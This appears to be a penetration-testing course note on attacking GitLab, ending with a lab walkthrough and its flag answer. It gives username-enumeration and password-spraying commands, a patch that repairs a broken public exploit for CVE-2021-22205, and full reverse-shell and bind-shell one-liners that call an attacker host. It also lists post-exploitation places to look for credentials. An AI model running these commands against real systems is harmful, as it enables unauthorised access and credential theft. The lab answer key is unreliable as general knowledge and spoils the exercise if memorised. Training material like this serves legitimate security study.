# Section 18 — Attacking GitLab

Two primary attack paths:

```
1. Username enumeration → password spray → authenticated access
2. CVE-2021-22205 — ExifTool image metadata RCE (GitLab CE ≤ 13.10.2)
```

---

## 1 — Username Enumeration

GitLab doesn't treat user enumeration as a vulnerability. Behavior exploited: returning HTTP 200 for valid usernames vs. 302 for invalid.

### Tool
```bash
# Bash version
./gitlab_userenum.sh --url http://TARGET/ --userlist users.txt

# Python3 version also available (same logic)
python3 gitlab_userenum.py --url http://TARGET/ --userlist users.txt
```

### Account lockout defaults
| Setting | Default |
|---------|---------|
| Max failed attempts before lock | 10 |
| Auto-unlock after | 10 minutes |

Lockout config (GitLab source):
```ruby
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

Since GitLab 16.6, admins can configure via UI. Below 16.6, only configurable by recompiling from source. Most installs run defaults — 10 attempts per 10 minutes is usable for careful spraying.

### Password spray targets after enumeration
```
Welcome1      Password123      Admin1234
Summer2024    Winter2024       Company@123
```

---

## 2 — CVE-2021-22205: Authenticated RCE (ExifTool)

**Affected:** GitLab CE/EE ≤ 13.10.2  
**Root cause:** GitLab Workhorse passes uploaded images to ExifTool for metadata stripping. ExifTool < 12.24 is vulnerable to arbitrary command execution via crafted DjVu/image file metadata.  
**Result:** RCE as the `git` user on the GitLab server.  
**Auth required:** Valid account (use self-registration if enabled).

Requires `djvulibre-bin`: `sudo apt install -y djvulibre-bin`

### Upload endpoint fix (49951.py from ExploitDB is broken)

The ExploitDB script (`49951.py`) has two bugs: it grabs the CSRF token from the login page after auth (wrong), and targets `/uploads/user` (404). Apply this patch:

```python
# Line 75-77 — replace with:
r = session.get(gitlab_url + "/dashboard")
soup = BeautifulSoup(r.text, features="lxml")
csrf = next((m.get('content') for m in soup.find_all('meta') if m.get('name') == 'csrf-token'), None)

# Line 94 — replace with:
r = session.post(gitlab_url+'/uploads/personal_snippet', files=files, cookies=cookies, headers=headers, verify=False)
```

### Reverse shell (outbound may be blocked — use bind shell if so)

```bash
# Attempt 1: reverse shell
nc -lvnp 4444
python3 gitlab_13_10_2_rce.py \
  -t http://TARGET \
  -u USER -p PASS \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f'

# If no callback — use bind shell instead
python3 gitlab_13_10_2_rce.py \
  -t http://TARGET \
  -u USER -p PASS \
  -c 'rm -f /tmp/b;mkfifo /tmp/b;nc -lvnp 9999 </tmp/b|/bin/bash 2>&1>/tmp/b &'

# Connect to bind shell
nc -w 5 TARGET_IP 9999
```

### Registration prerequisite
```bash
# New accounts land on welcome/onboarding — must complete it before upload endpoint works
# Submit: PUT /users/sign_up/welcome with role and setup_for_company fields
# Or just browse to the welcome page and submit the form manually
```

### Expected output
```
[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

### Shell lands as
```
git@<hostname>:~/gitlab-workhorse$
uid=996(git) gid=997(git) groups=997(git)
```

---

## Exam Notes

- GitLab user enum: HTTP 200 = valid user, HTTP 302 = invalid user
- Default lockout: 10 attempts / 10-minute window — safe to spray carefully
- CVE-2021-22205 requires auth — self-registration bypasses this requirement entirely
- Shell lands as `git` user, not root — check for privesc or SUID binaries
- Repos visible to `git` user may contain credentials not accessible via web UI
- GitLab version ≤ 13.10.2: try CVE-2021-22205 immediately after getting any valid creds
- MSF module: `exploit/multi/http/gitlab_exif_rce`
- Check `/etc/gitlab/gitlab.rb` for database credentials, SMTP secrets, LDAP bind passwords

---

## Lab Walkthrough (`gitlab.inlanefreight.local` → `10.129.99.249`)

**vHost:** Add `10.129.99.249 gitlab.inlanefreight.local` to `/etc/hosts`

**Q1 — Find another valid user:**

Must use `xato-net-10-million-usernames.txt` — smaller lists miss `demo`. `bob` appears in partial scans but is not the expected answer.

```bash
# Get the script
searchsploit -m ruby/webapps/49821.sh

bash 49821.sh \
  --url http://gitlab.inlanefreight.local:8081/ \
  --userlist /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt \
  2>/dev/null | grep "exists"
```

Output: `root`, `bob`, **`demo`** — answer is **`demo`**

**Q2 — RCE flag:**

Register account `mrb3n:password1` via self-registration, then:

```bash
# Listener
nc -lvnp 8443

# Exploit
python3 gitlab_13_10_2_rce.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u mrb3n \
  -p password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```

Shell lands at `~/gitlab-workhorse/` — flag file present in that directory:

```bash
cat flag_gitlab.txt
```

**Flag:** `s3cure_y0ur_Rep0s!`  
**Shell user:** `git@app04`

**Note:** Reverse shell (outbound) was blocked by the lab firewall. Used bind shell instead — RCE sets up `nc -lvnp 9999` on the target, then we connect in.
